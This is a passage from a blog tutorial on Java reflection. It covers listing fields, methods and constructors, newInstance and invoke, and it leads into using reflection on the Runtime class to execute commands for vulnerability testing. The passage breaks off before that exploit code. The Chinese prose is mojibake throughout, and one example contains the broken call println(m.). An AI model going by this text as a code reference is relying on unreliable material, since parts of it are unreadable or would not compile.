punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñÊåáÂÆöÂêçÁß∞ÁöÑpublic‰øÆÈ•∞ÁöÑÊàêÂëòÂèòÈáè</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñÊåáÂÆöÁöÑÊàêÂëòÂèòÈáè</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray4<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="6.png" loading="lazy"></p><h3 id="Ëé∑ÂèñÊàêÂëòÊñπÊ≥ïMethod"><a href="#Ëé∑ÂèñÊàêÂëòÊñπÊ≥ïMethod" class="headerlink" title="Ëé∑ÂèñÊàêÂëòÊñπÊ≥ïMethod"></a>Ëé∑ÂèñÊàêÂëòÊñπÊ≥ïMethod</h3><p>Method getMethod(String name, Á±ª&lt;?&gt;‚Ä¶ parameterTypes) &#x2F;&#x2F;ËøîÂõûËØ•Á±ªÊâÄÂ£∞ÊòéÁöÑpublicÊñπÊ≥ï</p><p>Method getDeclaredMethod(String name, Á±ª&lt;?&gt;‚Ä¶ parameterTypes) &#x2F;&#x2F;ËøîÂõûËØ•Á±ªÊâÄÂ£∞ÊòéÁöÑÊâÄÊúâÊñπÊ≥ï</p><p>&#x2F;&#x2F;Á¨¨‰∏Ä‰∏™ÂèÇÊï∞Ëé∑ÂèñËØ•ÊñπÊ≥ïÁöÑÂêçÂ≠óÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞Ëé∑ÂèñÊ†áËØÜËØ•ÊñπÊ≥ïÁöÑÂèÇÊï∞Á±ªÂûã</p><p>Method[] getMethods() &#x2F;&#x2F;Ëé∑ÂèñÊâÄÊúâÁöÑpublicÊñπÊ≥ïÔºåÂåÖÊã¨Á±ªËá™Ë∫´Â£∞ÊòéÁöÑpublicÊñπÊ≥ïÔºåÁà∂Á±ª‰∏≠ÁöÑpublicÊñπÊ≥ï„ÄÅÂÆûÁé∞ÁöÑÊé•Âè£ÊñπÊ≥ï</p><p>Method[] getDeclaredMethods() &#x2F;&#x2F; Ëé∑ÂèñËØ•Á±ª‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ï</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MethodTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">study</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Â≠¶‰π†‰∏≠..."</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Ë∑ëÊ≠•‰∏≠..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ÂêÉÈ•≠‰∏≠..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Áù°Áú†‰∏≠..."</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"sleep"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫ClassÂØπË±°</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñÊâÄÊúâËØ•Á±ª‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ï</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods2 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñÊâÄÊúâÁöÑpublicÊñπÊ≥ïÔºåÂåÖÊã¨Á±ªËá™Ë∫´Â£∞ÊòéÁöÑpublicÊñπÊ≥ïÔºåÁà∂Á±ª‰∏≠ÁöÑpublicÊñπÊ≥ï„ÄÅÂÆûÁé∞ÁöÑÊé•Âè£ÊñπÊ≥ï</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> methods3 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"study"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñstudyÊñπÊ≥ï</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>methods3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> method4 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñsleepÊñπÊ≥ï</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="7.png" loading="lazy"></p><h3 id="Ëé∑ÂèñÊûÑÈÄ†ÂáΩÊï∞Constructor"><a href="#Ëé∑ÂèñÊûÑÈÄ†ÂáΩÊï∞Constructor" class="headerlink" title="Ëé∑ÂèñÊûÑÈÄ†ÂáΩÊï∞Constructor"></a>Ëé∑ÂèñÊûÑÈÄ†ÂáΩÊï∞Constructor</h3><p>Constructor&lt;?&gt;[] getConstructors() ÔºöÂè™ËøîÂõûpublicÊûÑÈÄ†ÂáΩÊï∞</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ÔºöËøîÂõûÊâÄÊúâÊûÑÈÄ†ÂáΩÊï∞</p><p>Constructor&lt;&gt; getConstructor(Á±ª&lt;?&gt;‚Ä¶ parameterTypes) : ÂåπÈÖçÂíåÂèÇÊï∞ÈÖçÂûãÁõ∏Á¨¶ÁöÑpublicÊûÑÈÄ†ÂáΩÊï∞</p><p>Constructor&lt;&gt; getDeclaredConstructor(Á±ª&lt;?&gt;‚Ä¶ parameterTypes) Ôºö ÂåπÈÖçÂíåÂèÇÊï∞ÈÖçÂûãÁõ∏Á¨¶ÁöÑÊûÑÈÄ†ÂáΩÊï∞</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstructorTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Êó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ÊúâÂèÇÊûÑÈÄ†ÂáΩÊï∞"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ÁßÅÊúâÊûÑÈÄ†ÂáΩÊï∞"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ConstructorTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors1  <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------ÂàÜÂâ≤Á∫ø---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="8.png" loading="lazy"></p><h3 id="ÂèçÂ∞ÑÂàõÂª∫Á±ªÂØπË±°"><a href="#ÂèçÂ∞ÑÂàõÂª∫Á±ªÂØπË±°" class="headerlink" title="ÂèçÂ∞ÑÂàõÂª∫Á±ªÂØπË±°"></a>ÂèçÂ∞ÑÂàõÂª∫Á±ªÂØπË±°</h3><p>Âú®ÂâçÈù¢Êàë‰ª¨Ëé∑Âèñ‰∫ÜClassÂØπË±°Ôºå‰πãÂêéÂ±ïÁ§∫‰∫Ü‰∏ÄÁ≥ªÂàóËé∑ÂèñÊàêÂëòÂèòÈáè„ÄÅÊàêÂëòÊñπÊ≥ïÂíåÊàêÂëòÂáΩÊï∞ÁöÑÊñπÂºèÂêéÔºåÊàë‰ª¨Áé∞Âú®ÂèØ‰ª•ÈÄöËøáÂèçÂ∞ÑÊù•ÁîüÊàêÂÆû‰æãÂåñÂØπË±°Ôºå‰∏ÄËà¨Êàë‰ª¨‰ΩøÁî®ClassÂØπË±°ÁöÑnewInstance()ÊñπÊ≥ïÊù•ËøõË°åÂàõÂª∫Á±ªÂØπË±°„ÄÇ</p><p>‰ΩøÁî®ÁöÑÊñπÂºè‰πüÁâπÂà´ÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÈÄöËøáfornameÊñπÊ≥ïËé∑ÂèñÂà∞ÁöÑclassÂØπË±°‰∏≠ËøõË°ånewInstanceÊñπÊ≥ïÂàõÂª∫Âç≥ÂèØ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫ClassÂØπË±°</span>            <span class="token class-name">Object</span> m1 <span class="token operator">=</span>  c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫Á±ªÂØπË±°</span></code></pre><p>ËøôÈáå‰πüÈ°∫‰æøËØ¥‰∏ãinvokeÊñπÊ≥ïÔºåinvokeÊñπÊ≥ï‰Ωç‰∫éjava.lang.reflect.MethodÁ±ª‰∏≠ÔºåÁî®‰∫éÊâßË°åÊüê‰∏™ÁöÑÂØπË±°ÁöÑÁõÆÊ†áÊñπÊ≥ï„ÄÇ<br>‰∏ÄËà¨‰ºöÂíågetMethodÊñπÊ≥ïÈÖçÂêàËøõË°åË∞ÉÁî®„ÄÇ</p><p>‰ΩøÁî®Áî®Ê≥ï</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Á±ªÁöÑÂÆû‰æãÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫Áõ∏Â∫îÂáΩÊï∞‰∏≠ÁöÑÂèÇÊï∞</p><p>objÔºö‰ªé‰∏≠Ë∞ÉÁî®Â∫ïÂ±ÇÊñπÊ≥ïÁöÑÂØπË±°ÔºåÂøÖÈ°ªÊòØÂÆû‰æãÂåñÂØπË±°</p><p>argsÔºö Áî®‰∫éÊñπÊ≥ïÁöÑË∞ÉÁî®ÔºåÊòØ‰∏Ä‰∏™objectÁöÑÊï∞ÁªÑÔºåÂèÇÊï∞ÊúâÂèØËÉΩÊòØÂ§ö‰∏™</p><p>‰ΩÜÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåinvokeÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Âπ∂‰∏çÊòØÂõ∫ÂÆöÁöÑÔºö</p><p><strong>Â¶ÇÊûúË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÊòØÊôÆÈÄöÊñπÊ≥ïÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Â∞±ÊòØÁ±ªÂØπË±°Ôºõ</strong></p><p><strong>Â¶ÇÊûúË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÊòØÈùôÊÄÅÊñπÊ≥ïÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Â∞±ÊòØÁ±ªÔºõ</strong></p><p>Â∞ÜÊàë‰ª¨ÁöÑÁü•ËØÜËøõË°åÊï¥ÂêàÂΩíÁ∫≥‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•ÂÜô‰∏™ÂÆåÊï¥ÁöÑÂ∞è‰æãÂ≠ê„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reflectMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ÂèçÂ∞ÑÊµãËØïÊàêÂäü!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫ClassÂØπË±°</span>            <span class="token class-name">Object</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫Á±ªÂÆû‰æãÂØπË±°</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"reflectMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ëé∑ÂèñreflectMethodÊñπÊ≥ï</span>            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ë∞ÉÁî®Á±ªÂÆû‰æãÂØπË±°ÊñπÊ≥ï</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="9.png" loading="lazy"></p><h3 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h3><p>‰∏äÈù¢Êàë‰ª¨ËÆ≤Ëø∞‰∫ÜÂèçÂ∞ÑÊú∫Âà∂ÊµÅÁ®ãÊ¶ÇÂøµÂíåÂü∫Êú¨‰ΩøÁî®ÊñπÊ≥ïÔºå‰ªéClassÂØπË±°Ëé∑ÂèñÔºåÂà∞Ëé∑ÂèñÊàêÂëòÂèòÈáè„ÄÅÊàêÂëòÊñπÊ≥ïÂíåÊûÑÈÄ†ÂáΩÊï∞ÔºåÊé•ÁùÄÊòØnewInstanceÂàõÂª∫Á±ªÂØπË±°ÂíåinvokeÊñπÊ≥ïÔºåÊúÄÂêéÊòØ‰∏Ä‰∏™ÁÆÄÂçïÂèçÂ∞Ñ‰æãÂ≠êÁöÑÁªÑÊàê„ÄÇÁõ∏‰ø°Â§ßÂÆ∂ÈÉΩÂØπÂèçÂ∞ÑÊúâ‰∏™ÂæàÊ∏ÖÊô∞ÁöÑ‰∫ÜËß£ÂíåËÆ§ËØÜÔºåÁé∞Âú®Êàë‰ª¨Êù•ÁúãÁúãÊàë‰ª¨Âπ≥Êó∂ÊºèÊ¥ûÊµãËØï‰∏≠ÔºåÂ¶Ç‰Ωï‰ΩøÁî®javaÂèçÂ∞Ñ‰∏≠Â¶Ç‰ΩïËé∑ÂèñRuntimeÁ±ªÊù•ÂëΩ‰ª§ÊâßË°åÊµãËØïÂºπÂá∫ËÆ°ÁÆóÂô®„ÄÇ</p><h3 id="Âà©Áî®ÂèçÂ∞ÑÊûÑÈÄ†RuntimeÁ±ªÊâßË°å"><a href="#Âà©Áî®ÂèçÂ∞ÑÊûÑÈÄ†RuntimeÁ±ªÊâßË°å" class="headerlink" title="Âà©Áî®ÂèçÂ∞ÑÊûÑÈÄ†RuntimeÁ±ªÊâßË°å"></a>Âà©Áî®ÂèçÂ∞ÑÊûÑÈÄ†RuntimeÁ±ªÊâßË°å</h3><p>ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÂÖàÊ®°‰ªøÂâçÈù¢ÁöÑÂèçÂ∞Ñ‰æãÂ≠êÔºåÂ∞ùËØïÂéªÂèçÂ∞ÑÊâßË°åRuntimeÁ±ªÂéªÂëΩ‰ª§ÊâßË°å„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token 